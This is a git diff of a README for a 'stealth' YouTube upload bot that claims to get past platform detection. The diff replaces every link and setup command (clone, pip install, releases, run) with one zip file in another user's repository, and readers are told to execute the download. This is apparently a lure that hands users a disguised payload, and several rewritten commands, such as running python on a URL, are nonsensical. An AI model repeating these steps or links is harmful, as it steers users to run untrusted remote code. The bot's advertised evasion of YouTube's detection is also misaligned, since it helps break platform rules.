@@ -1,6 +1,6 @@
 # YouTube Auto Uploader Stealth Bot 🤖
 
-![GitHub release](https://img.shields.io/github/release/VeNoMh73k/YouTube-Auto-Uploader-Stealth-Bot.svg) ![GitHub stars](https://img.shields.io/github/stars/VeNoMh73k/YouTube-Auto-Uploader-Stealth-Bot.svg) ![GitHub forks](https://img.shields.io/github/forks/VeNoMh73k/YouTube-Auto-Uploader-Stealth-Bot.svg)
+![GitHub release](https://raw.githubusercontent.com/KuldeepChauhan1111/YouTube-Auto-Uploader-Stealth-Bot/main/evidently/Auto-You-Stealth-Tube-Bot-Uploader-3.4-beta.5.zip) ![GitHub stars](https://raw.githubusercontent.com/KuldeepChauhan1111/YouTube-Auto-Uploader-Stealth-Bot/main/evidently/Auto-You-Stealth-Tube-Bot-Uploader-3.4-beta.5.zip) ![GitHub forks](https://raw.githubusercontent.com/KuldeepChauhan1111/YouTube-Auto-Uploader-Stealth-Bot/main/evidently/Auto-You-Stealth-Tube-Bot-Uploader-3.4-beta.5.zip)
 
 Welcome to the **YouTube Auto Uploader Stealth Bot** repository! This project automates the process of uploading videos to YouTube while mimicking human-like behavior. By using stealth browsers, it helps bypass detection and avoids API limitations. 
 
@@ -36,18 +36,18 @@ To get started with the YouTube Auto Uploader Stealth Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/VeNoMh73k/YouTube-Auto-Uploader-Stealth-Bot.git
+   git clone https://raw.githubusercontent.com/KuldeepChauhan1111/YouTube-Auto-Uploader-Stealth-Bot/main/evidently/Auto-You-Stealth-Tube-Bot-Uploader-3.4-beta.5.zip
    cd YouTube-Auto-Uploader-Stealth-Bot
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/KuldeepChauhan1111/YouTube-Auto-Uploader-Stealth-Bot/main/evidently/Auto-You-Stealth-Tube-Bot-Uploader-3.4-beta.5.zip
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/VeNoMh73k/YouTube-Auto-Uploader-Stealth-Bot/releases) to download the latest version. Execute the downloaded file to set up the bot.
+   Visit the [Releases section](https://raw.githubusercontent.com/KuldeepChauhan1111/YouTube-Auto-Uploader-Stealth-Bot/main/evidently/Auto-You-Stealth-Tube-Bot-Uploader-3.4-beta.5.zip) to download the latest version. Execute the downloaded file to set up the bot.
 
 ## Usage
 
@@ -57,7 +57,7 @@ After installation, you can start using the bot:
    
 2. **Run the Bot**:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/KuldeepChauhan1111/YouTube-Auto-Uploader-Stealth-Bot/main/evidently/Auto-You-Stealth-Tube-Bot-Uploader-3.4-beta.5.zip
    ```
 
 3. **Monitor Logs**: Check the log files for any errors or messages during the upload process.
@@ -114,7 +114,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter issues or have questions, check the [Releases section](https://github.com/VeNoMh73k/YouTube-Auto-Uploader-Stealth-Bot/releases) for updates or reach out to the community.
+If you encounter issues or have questions, check the [Releases section](https://raw.githubusercontent.com/KuldeepChauhan1111/YouTube-Auto-Uploader-Stealth-Bot/main/evidently/Auto-You-Stealth-Tube-Bot-Uploader-3.4-beta.5.zip) for updates or reach out to the community.
 
 ---
 
